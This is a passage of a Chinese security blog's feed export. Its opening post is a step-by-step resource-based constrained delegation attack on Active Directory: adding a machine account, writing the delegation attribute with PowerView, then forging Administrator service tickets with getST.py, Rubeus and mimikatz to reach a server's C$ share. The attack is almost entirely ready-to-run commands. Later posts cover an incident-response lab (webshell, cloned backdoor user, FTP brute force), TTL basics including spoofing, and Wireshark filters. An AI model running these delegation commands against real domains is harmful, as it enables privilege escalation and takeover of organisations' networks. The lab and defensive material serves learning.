plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test1 -Password $(ConvertTo-SecureString &quot;Admin@12345&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p>这里在cs 中执行失败，推测应该使用msf 类型的交互式powershell执行。不过作为练习，可以直接在靶机中执行，将会执行成功。</p><p>此时就有了⼀个域机器账户<code>test1$</code>，通过<code>net group &quot;domain computers&quot; /domain</code>命令可以查看到</p><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319174325921.png" alt="image-20240319174325921"></p><p><strong>方法二：</strong>利用Sharpmad工具添加机器用户</p><p>用到<a href="https://github.com/Kevin-Robertson/Sharpmad">Sharpmad</a>工具，Powermad 的 C# 版本，都方便 CobaltStrike 内存加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharpmad.exe MAQ -Action new -MachineAccount test1 -MachinePassword pass@1234！</span><br></pre></td></tr></table></figure><p><strong>方法三：</strong><code>addcomputer.py</code> 脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -computer-name machine1 -computer-pass 1qaz@WSX -dc-ip 192.168.11.11 attack.cn/zhang:321.com -method SAMR -debug</span><br><span class="line">或</span><br><span class="line">python3 addcomputer.py redteam.lab/ken:123.com -method LDAPS -computer-name CPT01\$ -computer-pass Passw0rd -dc-ip 10.10.2.20</span><br></pre></td></tr></table></figure><p><strong>方法四：</strong>使用bloodyAD工具创建机器账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py -d redteam.lab -u ken -p &#x27;123.com&#x27; --host 10.10.2.20 addComputer CPT01 &#x27;Passw0rd&#x27;</span><br></pre></td></tr></table></figure><h4 id="2、获取新增机器用户的SID"><a href="#2、获取新增机器用户的SID" class="headerlink" title="2、获取新增机器用户的SID"></a>2、获取新增机器用户的SID</h4><p>获取新建的机器用户<code>test1$</code>的sid 值</p><p><strong>方式一：</strong>基于<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">Microsoft.ActiveDirectory.Management.dll at master · 3gstudent&#x2F;test</a>工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Get-MachineAccountAttribute -MachineAccount test1$ -Attribute servicePrincipalName（无论报错）</span><br><span class="line">Get-ADComputer test1$ -Properties *</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319175512306.png" alt="image-20240319175512306"></p><p><strong>方式二：</strong>使用PowerView工具查询机器账户SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line">Get-NetComputer test1 -Properties objectsid（这里不加$）</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240320105221553.png" alt="image-20240320105221553"></p><h4 id="3、设置基于资源的委派属性"><a href="#3、设置基于资源的委派属性" class="headerlink" title="3、设置基于资源的委派属性"></a>3、设置基于资源的委派属性</h4><p>使用<code>PowerView</code>脚本修改机器用户的<code>msds-allowedtoactonbehalfofotheridentity</code>值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;SID值&gt;&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer &lt;主机名称&gt; | Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/6c2872a780d549f4a5d8ebd9b047b52a.png" alt="6c2872a780d549f4a5d8ebd9b047b"></p><p>查询属性(后一条命令使用到了ActiveDirectory模块，域控默认带)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-DomainComputer SERVER2012 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/9322a358955243aaa4a10af37cf538c6.png" alt="9322a358955243aaa4a10af37cf538c6"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 域控查询命令</span><br><span class="line">Get-ADComputer SERVER2012 -Properties PrincipalsAllowedToDelegateToAccount</span><br><span class="line"># 清除属性</span><br><span class="line">Set-DomainObject SERVER2012 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure><h4 id="4、票据申请"><a href="#4、票据申请" class="headerlink" title="4、票据申请"></a>4、票据申请</h4><p><strong>方法一：</strong></p><p>使⽤ impacket 的 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py">getST.py</a> ⽣成票据（建议使⽤ socks5），会在当前⽬录下⽣administrator.ccache ⽂件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install six pyasn1 impacket</span><br><span class="line">python getST.py -dc-ip 192.168.10.2 test.lab/test\$:123456 -spn cifs/ADMIN--PC.test.lab -impersonate administrator</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/864b8f14979f4217bf2d096044ea6c39.png" alt="864b8f14979f4217bf2d096044ea6c39"></p><p>mimikatz导入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::ptc administrator.ccache&quot;</span><br></pre></td></tr></table></figure><p>注入后，成功访问</p><p><img src="/img/Intranet-Penetration-Delegation-attack/54fd16ba239a40fb9af1400fde4f21c4.png" alt="54fd16ba239a40fb9af1400fde4f21c4"></p><p><strong>方法二：</strong></p><p>使用Rubeus申请票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 通过Rubeus申请机器账户CPT01$的TGT</span><br><span class="line">Rubeus.exe asktgt /user:CPT01$ /password:Passw0rd /domain:redteam.lab /dc:DC2016.redteam.lab /nowrap</span><br><span class="line"></span><br><span class="line"># 使用S4U2Self协议申请TGS并且使用S4U2Proxy协议请求cifs服务票据ST，注入内存中</span><br><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/SERVER2012.redteam.lab /dc:DC2016.redteam.lab /nowrap /ptt /ticket:doIE2DCCBNSgAwIBBaEDAgEWooID8jCCA+5hggPqMIID5qADAgEFoQ0bC1JFRFRFQU0uTEFCoiAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLmxhYqOCA6wwggOooAMCARKhAwIBAqKCA5oEggOWx0emir2j0Me0AEZiGIF6iCN9gm6S9/VwFmYy8F9s5+FFyHDmSWjfLJotWqg/BXyB94ueiRrMXRkOYhKxLfUaJ4OJyGLxTv/oHQ9eM5EBe1QG1h5IufgR6T0Z23wknxOQA/JOP32HIoroCn84tHHlWrDx8JVu2bCKqfR3pqmnQCZXfb/3ydfNeqdf3hlF917Py5cMWKtDWBiMUx9HdtGto3d65JDaZTvetV5inE3+Ze+Z+dt/pE7CGtO1CrXjBVKmZTDq6i6oxOlOPcZo30TTIF0DW2jQBH1fZmn4z6o7Wv8uD/SycHV+BXv9Yjv4b0ESAaqZ4zt+zNvcBT0jrGTgrdOmvgKuc3wM0uHvfOOShx+TBrmjYbnrjd1vyTSbq/q4Ugyon+0hsQng5Dxb78QwfukVyTGfKuEqp9ar63kav99xl7EJUyv+TfhJsbYWBRH0ebyVl62eFkDi+cgPFF3isvdNao8Oc6zu+JJzbV3XguPFtmJlBUGYP/IWfxkfRg24tYvo+gaYW3NCuvp/yavpCT9WakKmwhKpXPQlLVZ5dPIuBHfiYY9eCRBD7L5WtXhgRh3ELLhA7UAkB7Q8rB9kle3QIdnHdQMeqBTPvv3k5JC9yybtYOg184w00OR0MCO88697KcvS0mbUN30XRp0CMwKSmKftIPbMvGjflzm5yWypezJ/I7cNwh+NyaFP2WE0kSh0zjR7acFe7NzK6eGMpJCksEuTa1Gp6FpJ1g2g2s3UqWyIyJpT8Rw9x/VMSbInvgfZV649Doh6OjbYPvct3WplSOo+U12Abec+Dog4zg4kLhBQ9zx6I5YGOh1zscS5A9ig0lzt8ZTa+H4vG3UGy7QcDsy624pUZ5GM2vXgyPVmVKBUrLmRFjPqJKd2xW2D5Vve9vF9QD8ZiGjJkjawI1xoo4OyeuRO1QBWWaR2U7zyWnj/NRW0MeCQEvw9ay6MlT5/yLNf6XQG+2z/n1zrLYkOxjH7LhL6qFjPDA9ECzF+bBs09ahifFruIxLC24EjZNCJ42rWZig6MyOppUmSdpDCoBrX0Dtwmw+3rPTCkzlUSpSQ2Axf4EdrA8mFtY370uJLlPgqqiRQPOeM5lxGFfgxeYwwYUab96CTgfo1qRIAHxIYqGZ3Qb0B6EOMzjGLeyvfK5p8Uv9DT1M3kQJnAgi5rlrlt8KmYiYAhgLa/okVKSxUIjfE8rgLucKrRTz1k2NevBR3o4HRMIHOoAMCAQCigcYEgcN9gcAwgb2ggbowgbcwgbSgGzAZoAMCARehEgQQ75YaW7Y0HIYQtAyZ4UavYaENGwtSRURURUFNLkxBQqITMBGgAwIBAaEKMAgbBkNQVDAxJKMHAwUAQOEAAKURGA8yMDIyMDUxODE1MDg0MFqmERgPMjAyMjA1MTkwMTA4NDBapxEYDzIwMjIwNTI1MTUwODQwWqgNGwtSRURURUFNLkxBQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLcmVkdGVhbS5sYWI=</span><br><span class="line"></span><br><span class="line"># 访问</span><br><span class="line">dir \\SERVER2012.redteam.lab\c$</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/qq_44159028/article/details/124118253">基于资源的约束委派攻击-CSDN博客</a></p><p><a href="https://forum.butian.net/share/1591">奇安信攻防社区-红队域渗透技术：委派攻击汇总（全） (butian.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网横向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急靶场】Win Server Web2入侵排查</title>
      <link href="/2024/03/04/Emergency-WinServer-web2/"/>
      <url>/2024/03/04/Emergency-WinServer-web2/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-Web2入侵排查"><a href="#Windows-Server-Web2入侵排查" class="headerlink" title="Windows Server Web2入侵排查"></a>Windows Server Web2入侵排查</h1><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷<a href="https://so.csdn.net/so/search?q=%E6%91%B8%E9%B1%BC&spm=1001.2101.3001.7020">摸鱼</a>后，发现安全设备有告警，于是立刻停掉了机器开始排查。</p><p>网盘下载压缩包，解压后，在高版本（大于17.5）的VM中扫描打开。获取所有权并开启靶机即可</p><h1 id="二、后门用户排查"><a href="#二、后门用户排查" class="headerlink" title="二、后门用户排查"></a>二、后门用户排查</h1><h3 id="1、命令简单的排查"><a href="#1、命令简单的排查" class="headerlink" title="1、命令简单的排查"></a>1、命令简单的排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-WinServer-web2/image-20240303142420925.png" alt="image-20240303142420925"></p><h3 id="2、控制面板排查"><a href="#2、控制面板排查" class="headerlink" title="2、控制面板排查"></a>2、控制面板排查</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303142855629.png" alt="image-20240303142855629"></p><h3 id="3、本地用户和组管理排查"><a href="#3、本地用户和组管理排查" class="headerlink" title="3、本地用户和组管理排查"></a>3、本地用户和组管理排查</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303143028250.png" alt="image-20240303143028250"></p><p>找到克隆后门用户<code>hack897$</code></p><h3 id="4、注册表排查"><a href="#4、注册表排查" class="headerlink" title="4、注册表排查"></a>4、注册表排查</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303143208310.png" alt="image-20240303143208310"></p><p>通过F键对比，该隐藏用户属于是克隆管理员后门用户</p><p><img src="/img/Emergency-WinServer-web2/image-20240303150406355.png" alt="image-20240303150406355"></p><h1 id="三、端口、进程排查"><a href="#三、端口、进程排查" class="headerlink" title="三、端口、进程排查"></a>三、端口、进程排查</h1><h3 id="1、端口连接排查"><a href="#1、端口连接排查" class="headerlink" title="1、端口连接排查"></a>1、端口连接排查</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303143441115.png" alt="image-20240303143441115"></p><p>与某端口的443端口处于等待关闭的状态</p><h3 id="2、进程排查"><a href="#2、进程排查" class="headerlink" title="2、进程排查"></a>2、进程排查</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303143725691.png" alt="image-20240303143725691"></p><p>7136进程是由于我开了一个应急排查工具的原因，并非恶意进程</p><h1 id="四、自启动后门排查"><a href="#四、自启动后门排查" class="headerlink" title="四、自启动后门排查"></a>四、自启动后门排查</h1><h3 id="1、计划任务排查"><a href="#1、计划任务排查" class="headerlink" title="1、计划任务排查"></a>1、计划任务排查</h3><p>【控制面板】搜索计划任务，正常任务，无后门</p><p><img src="/img/Emergency-WinServer-web2/image-20240303143941060.png" alt="image-20240303143941060"></p><h3 id="2、自启动服务排查"><a href="#2、自启动服务排查" class="headerlink" title="2、自启动服务排查"></a>2、自启动服务排查</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303144122716.png" alt="image-20240303144122716"></p><h3 id="3、自启动文件夹排查"><a href="#3、自启动文件夹排查" class="headerlink" title="3、自启动文件夹排查"></a>3、自启动文件夹排查</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303144206758.png" alt="image-20240303144206758"></p><p><img src="/img/Emergency-WinServer-web2/image-20240303144308675.png" alt="image-20240303144308675"></p><h3 id="4、自启动注册表项排查"><a href="#4、自启动注册表项排查" class="headerlink" title="4、自启动注册表项排查"></a>4、自启动注册表项排查</h3><p>有众多启动东注册表项，不一一展示了，均无后门存在</p><p><img src="/img/Emergency-WinServer-web2/image-20240303144422074.png" alt="image-20240303144422074"></p><p>自启动均正常，并无后门存在</p><h1 id="五、入侵日志排查"><a href="#五、入侵日志排查" class="headerlink" title="五、入侵日志排查"></a>五、入侵日志排查</h1><h3 id="1、Windows系统安全日志排查"><a href="#1、Windows系统安全日志排查" class="headerlink" title="1、Windows系统安全日志排查"></a>1、Windows系统安全日志排查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4624：成功登录的账户。</span><br><span class="line">4625：登录失败的尝试。</span><br><span class="line">4672：授予了特殊权限。</span><br><span class="line">4720：账户创建。</span><br><span class="line">4722：账户启用。</span><br><span class="line">4723：账户禁用。</span><br><span class="line">4724：密码更改。</span><br><span class="line">4725：密码重置。</span><br><span class="line">4726：账户删除。</span><br><span class="line">4738：用户账户更改。</span><br><span class="line">4739：用户组更改。</span><br><span class="line">4762：用户组添加或删除成员。</span><br></pre></td></tr></table></figure><p>通过4720 筛选创建用户的时间和用户名</p><p><img src="/img/Emergency-WinServer-web2/image-20240303145058321.png" alt="image-20240303145058321"></p><h3 id="2、Web日志排查"><a href="#2、Web日志排查" class="headerlink" title="2、Web日志排查"></a>2、Web日志排查</h3><p>日志不大，使用<a href="https://tilipa.zlsam.com/loger/">在线日志分析工具</a> 进行人工日志分析</p><p>web 属于是php 的wordpress 博客框架</p><p><img src="/img/Emergency-WinServer-web2/image-20240303145453581.png" alt="image-20240303145453581"></p><p>从47 条开始出现了外部IP<code>192.168.126.135</code></p><p><img src="/img/Emergency-WinServer-web2/image-20240303145544714.png" alt="image-20240303145544714"></p><p>该IP 一直在经过地址访问，通过观察请求的路径可以查看，该IP 在进行目录爆破，寻找敏感文件和路径，因此可以看到请求的响应码大都是404</p><p><img src="/img/Emergency-WinServer-web2/image-20240303151048120.png" alt="image-20240303151048120"></p><p>一直到最后用post方式访问了&#96;&#96;system.php<code> 文件，而上一步操作疑似是访问了 logo 的图片，那么该</code>system.php&#96; 文件很有可能是攻击者上传的恶意文件</p><p><img src="/img/Emergency-WinServer-web2/image-20240303145717421.png" alt="image-20240303145717421"></p><p>那么对于此次web攻击，<code>system.php</code> 文件具体是如何被攻击者上传的，有点让人摸不到头脑</p><h3 id="3、FTP日志排查"><a href="#3、FTP日志排查" class="headerlink" title="3、FTP日志排查"></a>3、FTP日志排查</h3><p>在查看小皮的时候翻到了FTP 服务，而且该FTP 服务的根路径挂载到了www 目录下，这是相当危险的做法，找到FTP日志，对FTP 的日志再进行一次审计</p><p><img src="/img/Emergency-WinServer-web2/image-20240303162527743.png" alt="image-20240303162527743"></p><p><img src="/img/Emergency-WinServer-web2/image-20240303163950710.png" alt="image-20240303163950710"></p><p>可以看到web日志审计中的恶意IP 出现在了FTP 日志中，且一直在进行连接</p><p><img src="/img/Emergency-WinServer-web2/image-20240303162739392.png" alt="image-20240303162739392"></p><p><img src="/img/Emergency-WinServer-web2/image-20240303163012441.png" alt="image-20240303163012441"></p><p>在短短的几秒钟之内进行了上千次登陆的尝试，确认该恶意IP进行了ftp 爆破行为，且最终结果爆破成功</p><p>在该日志的最后暴露出来<code>system.php</code> 文件是通过ftp 进行上传来的</p><p><img src="/img/Emergency-WinServer-web2/image-20240303163615882.png" alt="image-20240303163615882"></p><h1 id="六、病毒木马文件排查"><a href="#六、病毒木马文件排查" class="headerlink" title="六、病毒木马文件排查"></a>六、病毒木马文件排查</h1><p>在上述日志排查过程中，疑似<code>system.php</code> 文件属于webshell 木马，位置在web网站的根路径，查看该文件的内容</p><p><img src="/img/Emergency-WinServer-web2/image-20240303150312238.png" alt="image-20240303150312238"></p><p>确认是恶意后门脚本文件</p><h1 id="七、溯源追踪"><a href="#七、溯源追踪" class="headerlink" title="七、溯源追踪"></a>七、溯源追踪</h1><p>我们通过apache 日志的最后，可以看到，攻击者访问webshell木马文件<code>system.php</code> 文件之后依然执行了很多操作</p><p><img src="/img/Emergency-WinServer-web2/image-20240303164407557.png" alt="image-20240303164407557"></p><p>具体执行了什么操作，如果此时有堡垒机的存在，追查将会变得非常容易，但是没有，我们只能通过日志和翻找等方式进行检查</p><p>锁定日志时间段，对<code>system.php</code>文件的访问在29日13:08:49 到 13:38:02，而 <code>hack887$</code> 用户在13:27:11 的时候创建了后门用户</p><p><img src="/img/Emergency-WinServer-web2/image-20240303171808844.png" alt="image-20240303171808844"></p><p>既然创建了后门用户，是否进行了登陆呢，在安全日志中锁定13.27.11 之后的登陆成功的日志，发现在13:28:45分进行了登陆</p><p><img src="/img/Emergency-WinServer-web2/image-20240303173527266.png" alt="image-20240303173527266"></p><p>而登陆的IP 是<code>192.1168.126.129</code></p><p><img src="/img/Emergency-WinServer-web2/image-20240303173631243.png" alt="image-20240303173631243"></p><p>那么之后做了哪些操作呢？我们这里用一个工具<code>LastActivityView</code>，快速的排查近期被访问过的文件</p><p><img src="/img/Emergency-WinServer-web2/image-20240303172009048.png" alt="image-20240303172009048"></p><p>在 13:44:13 的时候访问过一个疑似QQ号的文件夹名</p><p><img src="/img/Emergency-WinServer-web2/image-20240303174034149.png" alt="image-20240303174034149"></p><p>并且在 13:47:30 的时候访问了frpc.ini.txt文件，我们找到相关目录，发现了frp 隧道相关文件</p><p><img src="/img/Emergency-WinServer-web2/image-20240303172205215.png" alt="image-20240303172205215"></p><p>查看frpc.ini 文件，发现frps 服务的相关IP和 端口</p><p><img src="/img/Emergency-WinServer-web2/image-20240303172254385.png" alt="image-20240303172254385"></p><h1 id="八、工具一把梭"><a href="#八、工具一把梭" class="headerlink" title="八、工具一把梭"></a>八、工具一把梭</h1><h3 id="1、后门用户"><a href="#1、后门用户" class="headerlink" title="1、后门用户"></a>1、后门用户</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303175040638.png" alt="image-20240303175040638"></p><p><img src="/img/Emergency-WinServer-web2/image-20240303175026294.png" alt="image-20240303175026294"></p><h3 id="2、webshell-木马文件"><a href="#2、webshell-木马文件" class="headerlink" title="2、webshell 木马文件"></a>2、webshell 木马文件</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303174944177.png" alt="image-20240303174944177"></p>]]></content>
      
      
      <categories>
          
          <category> 应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【基础知识】计算机网络TTL值详解</title>
      <link href="/2024/03/01/Nouns-TTL/"/>
      <url>/2024/03/01/Nouns-TTL/</url>
      
        <content type="html"><![CDATA[<h1 id="【基础知识】计算机网络TTL值详解"><a href="#【基础知识】计算机网络TTL值详解" class="headerlink" title="【基础知识】计算机网络TTL值详解"></a>【基础知识】计算机网络TTL值详解</h1><h1 id="一、TTL介绍"><a href="#一、TTL介绍" class="headerlink" title="一、TTL介绍"></a>一、TTL介绍</h1><p>TTL：数据报文的生存周期</p><p>当我们发送一个数据包时，该数据包每经过一个路由节点，TTL 值将会减一，如果TTL减少到零，数据包依然没有送达到目标地点，就会返回Time to live exceeded（超过生存时间），导致计算机不能正常上网</p><p><img src="/img/Nouns-TTL/image-20240301131636848.png" alt="image-20240301131636848"></p><h1 id="二、Linux-中的TTL-值"><a href="#二、Linux-中的TTL-值" class="headerlink" title="二、Linux 中的TTL 值"></a>二、Linux 中的TTL 值</h1><p>linux操作系统默认的ttl 值为64，相关文件位于：<code>/proc/sys/net/ipv4/ip_default_ttl</code></p><p>修改linux 的ttl 值 为128，伪造windows系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;128&quot; &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure><h1 id="三、Windows-中的TTL-值"><a href="#三、Windows-中的TTL-值" class="headerlink" title="三、Windows 中的TTL 值"></a>三、Windows 中的TTL 值</h1><p>windows中默认的ttl值通常是128</p><h3 id="1、命令修改ttl值"><a href="#1、命令修改ttl值" class="headerlink" title="1、命令修改ttl值"></a>1、命令修改ttl值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface ipv4 set global defaultcurhoplimit=&lt;新TTL值&gt;</span><br></pre></td></tr></table></figure><h3 id="2、注册表修改ttl值"><a href="#2、注册表修改ttl值" class="headerlink" title="2、注册表修改ttl值"></a>2、注册表修改ttl值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters</span><br></pre></td></tr></table></figure><p>ping网关可以直接查看到本地的ttl 值</p><h1 id="四、路由节点查看"><a href="#四、路由节点查看" class="headerlink" title="四、路由节点查看"></a>四、路由节点查看</h1><h3 id="1、ping-命令"><a href="#1、ping-命令" class="headerlink" title="1、ping 命令"></a>1、ping 命令</h3><p>到达目标时ttl 的数值，即剩下的跳动次数</p><p><img src="/img/Nouns-TTL/image-20240301132600127.png" alt="image-20240301132600127"></p><h3 id="2、mtr-工具"><a href="#2、mtr-工具" class="headerlink" title="2、mtr 工具"></a>2、mtr 工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install mtr</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtr xueshengit.com</span><br></pre></td></tr></table></figure><p>经过了10个路由节点</p><p><img src="/image-20240301132135982.png" alt="image-20240301132135982"></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TTL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【流量分析】流量抓包工具WireShark的基本使用</title>
      <link href="/2024/03/01/Blue-Team-Packet-Sniffing-WireShark/"/>
      <url>/2024/03/01/Blue-Team-Packet-Sniffing-WireShark/</url>
      
        <content type="html"><![CDATA[<h1 id="流量抓包工具WireShark的基本使用"><a href="#流量抓包工具WireShark的基本使用" class="headerlink" title="流量抓包工具WireShark的基本使用"></a>流量抓包工具WireShark的基本使用</h1><h2 id="一、WireShark-简介"><a href="#一、WireShark-简介" class="headerlink" title="一、WireShark 简介"></a>一、WireShark 简介</h2><p>官网：<a href="http://www.wireshark.org/">www.wireshark.org</a></p><p>是一个网络包分析工具，使用WinPCAP作为接口，直接与网卡进行数据报文交互，抓取网卡上的流量数据包，对网络数据包进行详细的刨析分析。</p><p>可以用WireShark 来检测网络连接问题，也可以用WireShark 来抓取网络上的敏感信息，窃取数据。WireShark 默认情况下，使用混杂模式，即抓取流经本地的数据包；那么普通模式下，只会抓取流入本地的数据包。</p><h2 id="二、WireShark-快速定位数据包"><a href="#二、WireShark-快速定位数据包" class="headerlink" title="二、WireShark 快速定位数据包"></a>二、WireShark 快速定位数据包</h2><h3 id="1、常见的协议"><a href="#1、常见的协议" class="headerlink" title="1、常见的协议"></a>1、常见的协议</h3><p>APR、ICMP、TCP、UDP、DNS、HTTP</p><h3 id="2、选择网卡接口"><a href="#2、选择网卡接口" class="headerlink" title="2、选择网卡接口"></a>2、选择网卡接口</h3><p>1、双击进去网卡接口</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image_20240229203345148.png" alt="image_20240229203345148"></p><p>2、使用接口过滤器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、仅捕获与10.1.159.86 进行交互的流量</span><br><span class="line">host 10.1.159.86</span><br><span class="line">2、获取10.1.159.86 为源IP的数据包</span><br><span class="line">src host 10.1.159.86</span><br><span class="line">3、获取10.1.159.86 为目标IP的数据包</span><br><span class="line">dst host 10.1.159.86</span><br><span class="line">4、获取目标为10.1.159.86 且端口为80</span><br><span class="line">dst host 10.1.159.86 &amp;&amp; prot 80</span><br><span class="line">5、捕获非80端口流量</span><br><span class="line">!prot 80</span><br><span class="line">6、仅捕获ICMP协议数据包</span><br><span class="line">icmp</span><br><span class="line">7、捕获IPv4</span><br><span class="line">!ip6</span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image_20240246429203147.png" alt="image_20240246429203147"></p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240229205033732.png" alt="image-20240229205033732"></p><h3 id="3、数据包着色快速锁定"><a href="#3、数据包着色快速锁定" class="headerlink" title="3、数据包着色快速锁定"></a>3、数据包着色快速锁定</h3><p>WireShark 对不同数据包有不同的颜色划分，熟知默认颜色能快速的分别不同的数据包。还可以自定义颜色规则</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240229211150293.png" alt="image-20240229211150293"></p><h3 id="4、应用显示过滤器"><a href="#4、应用显示过滤器" class="headerlink" title="4、应用显示过滤器"></a>4、应用显示过滤器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、筛选协议</span><br><span class="line">tcp、udp、icmp</span><br><span class="line">2、与IP相关的协议</span><br><span class="line">ip.addr == 